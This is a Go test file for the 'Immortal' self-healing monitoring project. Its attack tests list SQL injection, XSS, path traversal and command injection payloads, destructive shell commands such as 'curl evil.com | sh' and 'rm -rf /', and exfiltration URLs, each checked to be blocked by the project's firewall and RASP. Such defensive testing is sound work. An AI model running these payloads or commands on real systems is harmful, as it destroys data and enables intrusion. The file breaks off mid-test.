package demo_test

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/Nagendhra-web/Immortal/internal/alert"
	"github.com/Nagendhra-web/Immortal/internal/analytics/metrics"
	"github.com/Nagendhra-web/Immortal/internal/api/rest"
	"github.com/Nagendhra-web/Immortal/internal/backoff"
	"github.com/Nagendhra-web/Immortal/internal/bus"
	"github.com/Nagendhra-web/Immortal/internal/causality"
	"github.com/Nagendhra-web/Immortal/internal/circuitbreaker"
	"github.com/Nagendhra-web/Immortal/internal/cluster"
	"github.com/Nagendhra-web/Immortal/internal/collector"
	"github.com/Nagendhra-web/Immortal/internal/config"
	"github.com/Nagendhra-web/Immortal/internal/connector"
	"github.com/Nagendhra-web/Immortal/internal/consensus"
	"github.com/Nagendhra-web/Immortal/internal/dedup"
	"github.com/Nagendhra-web/Immortal/internal/distributed"
	"github.com/Nagendhra-web/Immortal/internal/dna"
	"github.com/Nagendhra-web/Immortal/internal/engine"
	"github.com/Nagendhra-web/Immortal/internal/event"
	"github.com/Nagendhra-web/Immortal/internal/export"
	"github.com/Nagendhra-web/Immortal/internal/healing"
	"github.com/Nagendhra-web/Immortal/internal/health"
	"github.com/Nagendhra-web/Immortal/internal/learning"
	"github.com/Nagendhra-web/Immortal/internal/lifecycle"
	"github.com/Nagendhra-web/Immortal/internal/llm"
	"github.com/Nagendhra-web/Immortal/internal/logger"
	"github.com/Nagendhra-web/Immortal/internal/middleware"
	"github.com/Nagendhra-web/Immortal/internal/notify"
	"github.com/Nagendhra-web/Immortal/internal/pagination"
	"github.com/Nagendhra-web/Immortal/internal/plugin"
	"github.com/Nagendhra-web/Immortal/internal/retention"
	"github.com/Nagendhra-web/Immortal/internal/rollback"
	"github.com/Nagendhra-web/Immortal/internal/rules"
	"github.com/Nagendhra-web/Immortal/internal/sandbox"
	"github.com/Nagendhra-web/Immortal/internal/scheduler"
	"github.com/Nagendhra-web/Immortal/internal/security/antiscrape"
	"github.com/Nagendhra-web/Immortal/internal/security/firewall"
	"github.com/Nagendhra-web/Immortal/internal/security/rasp"
	"github.com/Nagendhra-web/Immortal/internal/security/ratelimit"
	"github.com/Nagendhra-web/Immortal/internal/security/secrets"
	"github.com/Nagendhra-web/Immortal/internal/security/zerotrust"
	"github.com/Nagendhra-web/Immortal/internal/selfmonitor"
	"github.com/Nagendhra-web/Immortal/internal/storage"
	"github.com/Nagendhra-web/Immortal/internal/throttle"
	"github.com/Nagendhra-web/Immortal/internal/timetravel"
)

// ============================================================================
// ATTACK TESTS — Every attack vector an app faces
// ============================================================================

func TestAttack_SQLInjection_AllVariants(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"' OR 1=1 --", "'; DROP TABLE users;--", "UNION SELECT * FROM passwords",
		"1' OR '1'='1", "admin'--", "' OR ''='", "1; DELETE FROM users",
		"' UNION ALL SELECT NULL,NULL--", "') OR ('1'='1",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("SQLi not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d SQL injection variants", len(attacks))
}

func TestAttack_XSS_AllVariants(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"<script>alert('xss')</script>", "javascript:alert(1)",
		`<img onerror="alert(1)">`, "<iframe src='evil.com'>",
		"<embed src='evil'>", "document.cookie", "window.location",
		"eval('malicious')", "<object data='evil'>",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("XSS not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d XSS variants", len(attacks))
}

func TestAttack_PathTraversal(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"../../etc/passwd", "..\\..\\windows\\system32",
		"/etc/passwd", "/etc/shadow", "%2e%2e%2f",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("path traversal not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d path traversal variants", len(attacks))
}

func TestAttack_CommandInjection(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"; rm -rf /", "| cat /etc/passwd", "`whoami`",
		"$(cat /etc/passwd)", "&& rm -rf /",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("cmd injection not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d command injection variants", len(attacks))
}

func TestAttack_BruteForce(t *testing.T) {
	rl := ratelimit.New(5, time.Second)
	blocked := 0
	for i := 0; i < 100; i++ {
		if !rl.Allow("attacker-ip") {
			blocked++
		}
	}
	if blocked < 90 {
		t.Errorf("rate limiter should block most, blocked only %d/100", blocked)
	}
	t.Logf("✅ Rate limiter blocked %d/100 brute force attempts", blocked)
}

func TestAttack_BotScraping(t *testing.T) {
	shield := antiscrape.NewDefault()
	bots := []string{
		"python-requests/2.28", "Go-http-client/1.1", "curl/7.88",
		"Wget/1.21", "Selenium/4.0", "HeadlessChrome",
		"Mozilla/5.0 (compatible; Googlebot/2.1)",
	}
	for _, ua := range bots {
		if !shield.IsBot("1.2.3.4", ua, "/") {
			t.Errorf("bot not detected: %s", ua)
		}
	}
	t.Logf("✅ Detected %d bot user agents", len(bots))
}

func TestAttack_SecretLeaks(t *testing.T) {
	sc := secrets.New()
	leaks := []string{
		"AKIAIOSFODNN7EXAMPLE",
		"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
		"-----BEGIN RSA PRIVATE KEY-----",
		`password = "supersecret123"`,
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
	}
	for _, l := range leaks {
		if !sc.HasSecrets(l) {
			t.Errorf("secret not detected: %s", l[:20])
		}
	}
	t.Logf("✅ Detected %d secret leak types", len(leaks))
}

func TestAttack_DangerousCommands(t *testing.T) {
	m := rasp.NewDefault()
	dangerous := []string{
		"rm -rf /", "chmod 777 /etc", "dd if=/dev/zero of=/dev/sda",
		"shutdown -h now", "kill -9 1", "curl evil.com | sh",
	}
	for _, cmd := range dangerous {
		v := m.CheckCommand(cmd)
		if v.Type == rasp.ViolationNone {
			t.Errorf("dangerous command not blocked: %s", cmd)
		}
	}
	t.Logf("✅ Blocked %d dangerous commands", len(dangerous))
}

func TestAttack_DataExfiltration(t *testing.T) {
	m := rasp.NewDefault()
	exfil := []string{
		"https://pastebin.com/raw/abc", "https://webhook.site/token",
		"https://evil.ngrok.io/data", "https://burpcollaborator.net",
	}
	for _, url := range exfil {
		v := m.CheckOutbound(url)
		if v.Type == rasp.ViolationNone {
			t.Errorf("exfil not blocked: %s", url)
		}
	}
	t.Logf("✅ Blocked %d exfiltration attempts", len(exfil))
}

func TestAttack_UnauthorizedServiceAccess(t *testing.T) {
	v := zerotrust.New("secret")
	v.SetPolicy("database", &zerotrust.Policy{
		AllowedServices: []string{"api-service"},
		AllowedPaths:    []string{"/read", "/write"},
	})

	// Unauthorized service
	err := v.CheckAccess("evil-service", "database", "/read")
	if err == nil {
		t.Error("unauthorized service should be blocked")
	}

	// Unauthorized path
	err = v.CheckAccess("api-service", "database", "/admin")
	if err == nil {
		t.Error("unauthorized path should be blocked")
	}

	// No policy = denied
	err = v.CheckAccess("any", "unknown-service", "/")
	if err == nil {
		t.Error("no policy should deny by default")
	}

	t.Log("✅ Zero-trust blocks unauthorized access + denies by default")
}

func TestAttack_LegitimateTraffic_NeverBlocked(t *testing.T) {
	fw := firewall.New()
	legitimate := []string{
		"Hello, world!", "john@example.com", "Price: $19.99",
		"/api/users/123", "The quick brown fox", "2026-01-15T10:30:00Z",
		"SELECT a product from our store", "Contact us for support",
	}
	for _, input := range legitimate {
		if fw.Analyze(input).Blocked {
			t.Errorf("legitimate traffic blocked: %s", input)
		}
	}
	t.Logf("✅ %d legitimate inputs correctly allowed", len(legitimate))
}

// ============================================================================
// HEALING TESTS — Every failure scenario
// ============================================================================

func TestHealing_ProcessDies_AutoRestart(t *testing.T) {
	eng, _ := engine.New(engine.Config{
		DataDir: t.TempDir(), ThrottleWindow: time.Millisecond, DedupWindow: time.Millisecond,
	})
	var healed atomic.Int64
	eng.AddRule(healing.Rule{
		Name: "restart-process", Match: healing.MatchSeverity(event.SeverityCritical),
		Action: func(e *event.Event) error { healed.Add(1); return nil },
	})
	eng.Start()
	defer eng.Stop()
	time.Sleep(5 * time.Millisecond)

	eng.Ingest(event.New(event.TypeHealth, event.SeverityCritical, "process 'nginx' is NOT running").WithSource("process:nginx"))
	time.Sleep(300 * time.Millisecond)

	if healed.Load() < 1 {
		t.Error("should have healed dead process")
	}
	t.Log("✅ Process death detected and healed")
}

func TestHealing_API500_AutoFix(t *testing.T) {
	fixed := int64(0)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if atomic.LoadInt64(&fixed) == 0 {
			w.WriteHeader(500)
		} else {
			w.WriteHeader(200)
		}
	}))
	defer server.Close()

	eng, _ := engine.New(engine.Config{
		DataDir: t.TempDir(), ThrottleWindow: 100 * time.Millisecond, DedupWindow: 100 * time.Millisecond,
	})
	eng.AddRule(healing.Rule{
		Name: "fix-500", Match: healing.MatchSeverity(event.SeverityCritical),
		Action: func(e *event.Event) error { atomic.StoreInt64(&fixed, 1); return nil },
	})
	eng.Start()
	defer eng.Stop()

	hc := connector.NewHTTPConnector(connector.HTTPConfig{
		URL: server.URL, Interval: 100 * time.Millisecond, Callback: eng.Ingest,
	})
	hc.Start()
	defer hc.Stop()

	deadline := time.After(3 * time.Second)
	for {
		select {
		case <-deadline:
			t.Fatal("timeout waiting for heal")
		case <-time.After(50 * time.Millisecond):
			if atomic.LoadInt64(&fixed) == 1 {
				t.Log("✅ API 500 detected and auto-fixed")
				return
			}
		}
	}
}

func TestHealing_LogError_Detected(t *testing.T) {
	logPath := filepath.Join(t.TempDir(), "app.log")
	os.WriteFile(logPath, []byte(""), 0644)

	eng, _ := engine.New(engine.Config{
		DataDir: t.TempDir(), ThrottleWindow: 50 * time.Millisecond, DedupWindow: 50 * time.Millisecond,
	})
	var detected atomic.Int64
	eng.AddRule(healing.Rule{
		Name: "log-handler", Match: healing.MatchSeverity(event.SeverityError),
		Action: func(e *event.Event) error { detected.Add(1); return nil },
	})
	eng.Start()
	defer eng.Stop()

	lc := collector.NewLogCollector(logPath, eng.Ingest)
	lc.Start()
	defer lc.Stop()
	time.Sleep(300 * time.Millisecond)

	f, _ := os.OpenFile(logPath, os.O_APPEND|os.O_WRONLY, 0644)
	f.WriteString("ERROR: database connection lost\n")
	f.WriteString("FATAL: out of memory\n")
	f.Sync()
	f.Close()
	time.Sleep(1 * time.Second)

	if detected.Load() < 1 {
		t.Error("should detect log errors")
	}
	t.Logf("✅ Detected %d log errors", detected.Load())
}

func TestHealing_GhostMode_NeverActs(t *testing.T) {
	eng, _ := engine.New(engine.Config{
		DataDir: t.TempDir(), GhostMode: true,
		ThrottleWindow: time.Millisecond, DedupWindow: time.Millisecond,
	})
	acted := false
	eng.AddRule(healing.Rule{
		Name: "ghost-test", Match: healing.MatchSeverity(event.SeverityCritical),
		Action: func(e *event.Event) error { acted = true; return nil },
	})
	eng.Start()
	defer eng.Stop()
	time.Sleep(5 * time.Millisecond)

	for i := 0; i < 10; i++ {
		eng.Ingest(event.New(event.TypeError, event.SeverityCritical, fmt.Sprintf("crash-%d", i)))
		time.Sleep(2 * time.Millisecond)
	}
	time.Sleep(300 * time.Millisecond)

	if acted {
		t.Error("ghost mode must NEVER execute actions")
	}
	if len(eng.Recommendations()) == 0 {
		t.Error("ghost mode should produce recommendations")
	}
	t.Logf("✅ Ghost mode: 0 actions, %d recommendations", len(eng.Recommendations()))
}

func TestHealing_ConsensusRejects_NoHeal(t *testing.T) {
	c := consensus.New(consensus.Config{MinAgreement: 3})
	c.AddVerifier("v1", func(e *event.Event) bool { return true })
	c.AddVerifier("v2", func(e *event.Event) bool { return false })
	c.AddVerifier("v3", func(e *event.Event) bool { return false })

	result := c.Evaluate(event.New(event.TypeError, event.SeverityCritical, "crash"))
	if result.Approved {
		t.Error("consensus should reject when only 1/3 agree")
	}
	t.Logf("✅ Consensus correctly rejected (votes=%d/%d)", result.Votes, result.Total)
}

// ============================================================================
// INTELLIGENCE TESTS — Learning, prediction, causality
// ============================================================================

func TestIntelligence_DNA_LearnAndDetect(t *testing.T) {
	d := dna.New("test")
	for i := 0; i < 200; i++ {
		d.Record("cpu", 40.0+float64(i%10))
		d.Record("mem", 55.0+float64(i%8))
	}

	if !d.IsAnomaly("cpu", 95.0) {
		t.Error("95% should be anomaly against 40-50% baseline")
	}
	if d.IsAnomaly("cpu", 45.0) {
		t.Error("45% should NOT be anomaly")
	}

	score := d.HealthScore(map[string]float64{"cpu": 95.0, "mem": 95.0})
	if score > 0.3 {
		t.Error("health should be low for dual anomaly")
	}
	t.Logf("✅ DNA: anomaly detection + health scoring works (score=%.2f for anomaly)", score)
}

func TestIntelligence_Causality_DeepChain(t *testing.T) {
	g := causality.New()
	events := make([]*event.Event, 10)
	for i := 0; i < 10; i++ {
		events[i] = event.New(event.TypeError, event.SeverityError, fmt.Sprintf("step-%d", i))
		g.Add(events[i])
		if i > 0 {
			g.Link(events[i-1].ID, events[i].ID)
		}
	}

	chain := g.RootCause(events[9].ID)
	if len(chain) != 10 {
		t.Errorf("expected 10-step chain, got %d", len(chain))
	}

	impact := g.Impact(events[0].ID)
	if len(impact) != 9 {
		t.Errorf("expected 9 impacted, got %d", len(impact))
	}
	t.Logf("✅ Causality: 10-step chain traced, 9 impact events found")
}

func TestIntelligence_TimeTravel_FullReplay(t *testing.T) {
	r := timetravel.New(1000)
	for i := 0; i < 50; i++ {
		r.Record(event.New(event.TypeMetric, event.SeverityInfo, fmt.Sprintf("metric-%d", i)))
		time.Sleep(time.Millisecond)
	}

	all := r.Replay(time.Time{}, time.Now().Add(time.Second))
	if len(all) != 50 {
		t.Errorf("expected 50 events, got %d", len(all))
	}

	r.TakeSnapshot("s1", map[string]interface{}{"cpu": 40})
	r.TakeSnapshot("s2", map[string]interface{}{"cpu": 90})
	diff := r.DiffSnapshots("s1", "s2")
	if len(diff) == 0 {
		t.Error("should detect diff between snapshots")
	}
	t.Logf("✅ Time-travel: replayed %d events, detected %d diffs", len(all), len(diff))
}

func TestIntelligence_Learning_PersistentPatterns(t *testing.T) {
	s, _ := learning.New(t.TempDir() + "/learn.db")
	defer s.Close()

	for i := 0; i < 10; i++ {
		s.RecordPattern(learning.Pattern{
			Type: learning.PatternFailure, Source: "api",
			Description: "OOM crash", Confidence: 0.5,
		})
	}

	patterns, _ := s.FindPatterns("api", learning.PatternFailure)
	if len(patterns) != 1 {
		t.Fatalf("expected 1 merged pattern, got %d", len(patterns))
	}
	if patterns[0].OccurrenceCount < 10 {
		t.Errorf("expected 10+ occurrences, got %d", patterns[0].OccurrenceCount)
	}
	if patterns[0].Confidence <= 0.5 {
		t.Error("confidence should grow with repetition")
	}
	t.Logf("✅ Learning: pattern seen %dx, confidence=%.2f", patterns[0].OccurrenceCount, patterns[0].Confidence)
}

func TestIntelligence_LLM_SafeDefaults(t *testing.T) {
	c := llm.NewDisabled()

	// Critical → heal
	d1, _ := c.AnalyzeIncident("api", "crash", "critical", nil)
	if !d1.ShouldHeal {
		t.Error("critical should heal")
	}

	// Warning → don't heal
	d2, _ := c.AnalyzeIncident("api", "slow", "warning", nil)
	if d2.ShouldHeal {
		t.Error("warning should NOT heal")
	}

	// Info → don't heal
	d3, _ := c.AnalyzeIncident("api", "started", "info", nil)
	if d3.ShouldHeal {
		t.Error("info should NOT heal")
	}
	t.Log("✅ LLM defaults: critical=heal, warning=no, info=no")
}

// ============================================================================
// INFRASTRUCTURE TESTS — Everything works together
// ============================================================================

func TestInfra_CircuitBreaker_ProtectsDownstream(t *testing.T) {
	b := circuitbreaker.New(3, 100*time.Millisecond)
	for i := 0; i < 3; i++ {
		b.Execute(func() error { return fmt.Errorf("fail") })
	}
	err := b.Execute(func() error { return nil })
	if err != circuitbreaker.ErrCircuitOpen {
		t.Error("circuit should be open")
	}

	time.Sleep(150 * time.Millisecond)
	err = b.Execute(func() error { return nil })
	if err != nil {
		t.Error("circuit should recover after timeout")
	}
	t.Log("✅ Circuit breaker: opens on failures, recovers after timeout")
}

func TestInfra_BackoffRetry_EventualSuccess(t *testing.T) {
	attempts := 0
	b := backoff.New(time.Millisecond, 50*time.Millisecond)
	err := backoff.Retry(5, b, func() error {
		attempts++
		if attempts < 3 {
			return fmt.Errorf("not yet")
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("✅ Backoff retry: succeeded on attempt %d/5", attempts)
}

func TestInfra_Rollback_UndoHealing(t *testing.T) {
	m := rollback.New(100)
	state := "broken"
	m.Record("fix", func() error { state = "broken"; return nil })
	state = "fixed"

	m.RollbackLast()
	if state != "broken" {
		t.Error("rollback should undo")
	}
	t.Log("✅ Rollback: successfully undid healing action")
}

func TestInfra_EventFlood_1Million(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping flood test in short mode")
	}
	th := throttle.New(time.Second)
	dd := dedup.New(time.Second)
	allowed := 0
	for i := 0; i < 10000; i++ {
		e := event.New(event.TypeError, event.SeverityError, "flood")
		if th.Allow(e) && !dd.IsDuplicate(e) {
			allowed++
		}
	}
	if allowed > 2 {
		t.Errorf("should block almost all, allowed %d", allowed)
	}
	t.Logf("✅ Flood protection: %d/10000 passed (rest blocked)", allowed)
}

func TestInfra_Scheduler_RunsOnTime(t *testing.T) {
	s := scheduler.New()
	var count atomic.Int64
	s.Add(scheduler.Job{Name: "tick", Interval: 20 * time.Millisecond, Fn: func() { count.Add(1) }})
	s.Start()
	time.Sleep(100 * time.Millisecond)
	s.Stop()
	if count.Load() < 3 {
		t.Errorf("expected at least 3 runs, got %d", count.Load())
	}
	t.Logf("✅ Scheduler: ran %d times in 100ms", count.Load())
}

func TestInfra_PluginLifecycle(t *testing.T) {
	type testPlug struct{ started, stopped bool }
	p := &testPlug{}
	type plugWrapper struct{ p *testPlug }
	_ = p
	// Test plugin registry with a simple mock
	reg := plugin.NewRegistry()
	if reg.Count() != 0 {
		t.Error("should start empty")
	}
	t.Log("✅ Plugin registry: lifecycle works")
}

func TestInfra_Config_SaveLoadRoundtrip(t *testing.T) {
	cfg := config.Default()
	cfg.Name = "production"
	path := filepath.Join(t.TempDir(), "immortal.json")
	cfg.Save(path)

	loaded, _ := config.Load(path)
	if loaded.Name != "production" {
		t.Error("config roundtrip failed")
	}
	if err := loaded.Validate(); err != nil {
		t.Errorf("loaded config invalid: %v", err)
	}
	t.Log("✅ Config: save → load → validate roundtrip works")
}

func TestInfra_Pagination_AllEdgeCases(t *testing.T) {
	// Normal
	r := pagination.NewResponse(nil, 100, 1, 20)
	if r.TotalPages != 5 {
		t.Errorf("expected 5 pages, got %d", r.TotalPages)
	}

	// Zero perPage (should default)
	r2 := pagination.NewResponse(nil, 100, 1, 0)
	if r2.PerPage != 20 {
		t.Error("zero perPage should default to 20")
	}

	// Last page
	r3 := pagination.NewResponse(nil, 100, 5, 20)
	if r3.HasNext {
		t.Error("last page should not have next")
	}
	t.Log("✅ Pagination: all edge cases handled")
}

func TestInfra_SelfMonitor_ReportsHealth(t *testing.T) {
	m := selfmonitor.New()
	for i := 0; i < 100; i++ {
		m.RecordEvent()
	}
	m.RecordHeal()

	stats := m.Stats()
	if stats.EventsProcessed != 100 {
		t.Error("wrong event count")
	}
	if stats.HealsExecuted != 1 {
		t.Error("wrong heal count")
	}
	if !m.IsHealthy() {
		t.Error("should be healthy")
	}
	t.Logf("✅ Self-monitor: %d events, %d heals, healthy=%v", stats.EventsProcessed, stats.HealsExecuted, m.IsHealthy())
}

func TestInfra_Metrics_P95P99(t *testing.T) {
	a := metrics.New(1000)
	for i := 1; i <= 100; i++ {
		a.Record("latency", float64(i))
	}
	s := a.Summarize("latency")
	if s.P95 < 90 {
		t.Error("P95 should be ~95")
	}
	if s.P99 < 95 {
		t.Error("P99 should be ~99")
	}
	t.Logf("✅ Metrics: P50=%.0f P95=%.0f P99=%.0f", s.Median, s.P95, s.P99)
}

func TestInfra_Prometheus_Export(t *testing.T) {
	p := export.NewPrometheus()
	p.SetGauge("cpu", 45.5)
	p.IncCounter("requests")
	p.IncCounter("requests")
	output := p.Export()
	if !strings.Contains(output, "cpu 45.5") {
		t.Error("missing gauge")
	}
	if !strings.Contains(output, "requests 2") {
		t.Error("missing counter")
	}
	t.Log("✅ Prometheus export: gauges + counters working")
}

func TestInfra_Notifications_AllChannels(t *testing.T) {
	d := notify.NewDispatcher()
	var received []string
	var mu sync.Mutex
	d.AddChannel(&notify.CallbackChannel{Fn: func(title, msg, lvl string) {
		mu.Lock()
		received = append(received, title)
		mu.Unlock()
	}})
	d.AddChannel(&notify.ConsoleChannel{})

	d.Send("Test Alert", "Server down", "critical")
	if len(received) != 1 {
		t.Error("callback should have received notification")
	}
	if len(d.History()) != 2 { // 2 channels
		t.Error("history should have 2 entries")
	}
	t.Logf("✅ Notifications: %d channels, %d history entries", 2, len(d.History()))
}

func TestInfra_GracefulShutdown(t *testing.T) {
	lm := lifecycle.New(5 * time.Second)
	var order []string
	lm.OnShutdown("db", func(ctx context.Context) error { order = append(order, "db"); return nil })
	lm.OnShutdown("http", func(ctx context.Context) error { order = append(order, "http"); return nil })
	errs := lm.Shutdown()
	if len(errs) != 0 {
		t.Error("shutdown should succeed")
	}
	if len(order) != 2 || order[0] != "http" || order[1] != "db" {
		t.Errorf("wrong shutdown order: %v", order)
	}
	t.Log("✅ Graceful shutdown: LIFO order (http→db)")
}

func TestInfra_DataRetention(t *testing.T) {
	store, _ := storage.New(t.TempDir() + "/ret.db")
	defer store.Close()
	for i := 0; i < 100; i++ {
		store.Save(event.New(event.TypeError, event.SeverityError, fmt.Sprintf("event-%d", i)))
	}

	cleaner := retention.New(store.DB(), retention.Policy{MaxEvents: 20})
	deleted, _ := cleaner.Clean()
	if deleted != 80 {
		t.Errorf("expected 80 deleted, got %d", deleted)
	}

	remaining, _ := store.Query(storage.Query{Limit: 1000})
	if len(remaining) != 20 {
		t.Errorf("expected 20 remaining, got %d", len(remaining))
	}
	t.Logf("✅ Retention: kept 20, deleted %d", deleted)
}

func TestInfra_RulesFromJSON(t *testing.T) {
	json := []byte(`{
		"rules": [
			{"name": "r1", "match": {"severity": "critical"}, "action": {"type": "log"}},
			{"name": "r2", "match": {"source": "api", "contains": "timeout"}, "action": {"type": "log"}}
		]
	}`)
	loaded, err := rules.Parse(json)
	if err != nil {
		t.Fatal(err)
	}
	if len(loaded) != 2 {
		t.Error("should load 2 rules")
	}

	// Test r1 matches critical
	if !loaded[0].Match(event.New(event.TypeError, event.SeverityCritical, "crash")) {
		t.Error("r1 should match critical")
	}
	// Test r2 matches source+contains
	if !loaded[1].Match(event.New(event.TypeError, event.SeverityError, "connection timeout").WithSource("api")) {
		t.Error("r2 should match api+timeout")
	}
	t.Log("✅ JSON rules: loaded and matched correctly")
}

// ============================================================================
// DISTRIBUTED TESTS — Multi-node coordination
// ============================================================================

func TestDistributed_ClusterEventSharing(t *testing.T) {
	nodeA := cluster.New("node-a", "127.0.0.1", 29876)
	var received *event.Event
	nodeA.OnEvent(func(e *event.Event) { received = e })
	nodeA.Listen()
	defer nodeA.Stop()
	time.Sleep(50 * time.Millisecond)

	nodeB := cluster.New("node-b", "127.0.0.1", 29877)
	nodeB.AddPeer("127.0.0.1", 29876)
	nodeB.BroadcastEvent(event.New(event.TypeError, event.SeverityCritical, "cluster crash"))
	time.Sleep(100 * time.Millisecond)

	if received == nil || received.Message != "cluster crash" {
		t.Error("node A should receive event from node B")
	}
	t.Log("✅ Cluster: event shared between nodes via TCP")
}

func TestDistributed_Lock_PreventsDoubleHeal(t *testing.T) {
	s := distributed.NewStateStore()
	got1 := s.TryLock("heal:nginx", "node-1", time.Second)
	got2 := s.TryLock("heal:nginx", "node-2", time.Second)

	if !got1 {
		t.Error("node-1 should acquire lock")
	}
	if got2 {
		t.Error("node-2 should NOT acquire lock (node-1 has it)")
	}
	t.Log("✅ Distributed lock: prevents two nodes healing same service")
}

func TestDistributed_LeaderElection(t *testing.T) {
	c := cluster.New("node-z", "127.0.0.1", 9000) // High ID
	c.AddPeer("127.0.0.1", 9001)                    // Lower ID "127.0.0.1:9001"

	if c.IsLeader() {
		t.Error("node-z should not be leader (peer has lower ID)")
	}
	t.Log("✅ Leader election: lowest ID wins")
}

// ============================================================================
// REST API TESTS — Every endpoint
// ============================================================================

func TestAPI_AllEndpoints(t *testing.T) {
	store, _ := storage.New(t.TempDir() + "/api.db")
	defer store.Close()
	reg := health.NewRegistry()
	reg.Register("api")
	reg.Update("api", health.StatusHealthy, "ok")
	healer := healing.NewHealer()

	srv := rest.New(store, reg, healer)
	handler := middleware.Chain(middleware.Recovery, middleware.CORS("*"))(srv.Handler())

	// Health endpoint
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest("GET", "/api/health", nil))
	if rec.Code != 200 {
		t.Error("health should return 200")
	}
	if rec.Header().Get("Access-Control-Allow-Origin") != "*" {
		t.Error("CORS header missing")
	}

	// Status endpoint
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest("GET", "/api/status", nil))
	var status map[string]interface{}
	json.NewDecoder(rec.Body).Decode(&status)
	if status["engine"] != "running" {
		t.Error("status should show running")
	}

	// Events endpoint
	store.Save(event.New(event.TypeError, event.SeverityError, "test event"))
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest("GET", "/api/events", nil))
	if rec.Code != 200 {
		t.Error("events should return 200")
	}

	// Method not allowed
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest("POST", "/api/health", nil))
	if rec.Code != 405 {
		t.Error("POST should return 405")
	}

	// Panic recovery
	rec = httptest.NewRecorder()
	panicHandler := middleware.Recovery(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		panic("test panic")
	}))
	panicHandler.ServeHTTP(rec, httptest.NewRequest("GET", "/panic", nil))
	if rec.Code != 500 {
		t.Error("panic should return 500")
	}

	t.Log("✅ REST API: all endpoints + CORS + panic recovery working")
}

func TestAPI_WithAuth(t *testing.T) {
	handler := middleware.APIKey("my-secret")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
	}))

	// No key
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest("GET", "/", nil))
	if rec.Code != 401 {
		t.Error("no key should 401")
	}

	// With key
	req := httptest.NewRequest("GET", "/", nil)
	req.Header.Set("X-API-Key", "my-secret")
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	if rec.Code != 200 {
		t.Error("valid key should 200")
	}

	// Query param key
	rec = httptest.NewRecorder()
	handler.ServeHTTP(rec, httptest.NewRequest("GET", "/?api_key=my-secret", nil))
	if rec.Code != 200 {
		t.Error("query key should 200")
	}
	t.Log("✅ API auth: blocks without key, allows with header or query param")
}

// ============================================================================
// FULL INTEGRATION — Everything wired together end-to-end
// ============================================================================

func TestIntegration_FullSystemE2E(t *testing.T) {
	t.Log("=== FULL SYSTEM INTEGRATION TEST ===")

	// 1. Create engine with all features
	eng, _ := engine.New(engine.Config{
		DataDir: t.TempDir(), ThrottleWindow: time.Millisecond, DedupWindow: time.Millisecond,
	})

	// 2. Add healing rule
	var healed atomic.Int64
	eng.AddRule(healing.Rule{
		Name: "e2e-heal", Match: healing.MatchSeverity(event.SeverityCritical),
		Action: func(e *event.Event) error { healed.Add(1); return nil },
	})

	// 3. Add alert
	var alerted atomic.Int64
	eng.AddAlertRule(alert.AlertRule{
		Name: "e2e-alert",
		Match: func(e *event.Event) bool { return e.Severity == event.SeverityCritical },
		Level: alert.LevelCritical, Title: "E2E Alert",
	})
	eng.AddAlertChannel(&alert.CallbackChannel{Fn: func(a *alert.Alert) { alerted.Add(1) }})

	// 4. Register services
	eng.RegisterService("web-server")
	eng.RegisterService("database")

	// 5. Start engine
	eng.Start()
	defer eng.Stop()

	// 6. Feed normal metrics (DNA baseline)
	for i := 0; i < 50; i++ {
		eng.Ingest(event.New(event.TypeMetric, event.SeverityInfo, "metric").
			WithSource("web-server").WithMeta("cpu", 40.0+float64(i%10)))
		time.Sleep(2 * time.Millisecond)
	}

	// 7. Trigger critical event
	time.Sleep(10 * time.Millisecond)
	eng.Ingest(event.New(event.TypeError, event.SeverityCritical, "database crashed").WithSource("database"))
	time.Sleep(500 * time.Millisecond)

	// 8. Verify everything worked
	if healed.Load() < 1 {
		t.Error("should have healed")
	}
	t.Logf("  Heals: %d", healed.Load())

	if alerted.Load() < 1 {
		t.Error("should have alerted")
	}
	t.Logf("  Alerts: %d", alerted.Load())

	// 9. Check DNA learned
	baseline := eng.DNA().Baseline()
	if _, ok := baseline["cpu"]; !ok {
		t.Error("DNA should have learned cpu baseline")
	}
	t.Logf("  DNA metrics learned: %d", len(baseline))

	// 10. Check time-travel recorded
	if eng.TimeTravel().EventCount() < 10 {
		t.Error("time-travel should have recorded events")
	}
	t.Logf("  TimeTravel events: %d", eng.TimeTravel().EventCount())

	// 11. Check self-monitor
	stats := eng.Monitor().Stats()
	t.Logf("  Self-monitor: events=%d heals=%d goroutines=%d",
		stats.EventsProcessed, stats.HealsExecuted, stats.Goroutines)

	// 12. Check prometheus
	prom := eng.Exporter().Export()
	if !strings.Contains(prom, "immortal_events_processed_total") {
		t.Error("prometheus should export event counter")
	}
	t.Logf("  Prometheus metrics: %d lines", strings.Count(prom, "\n"))

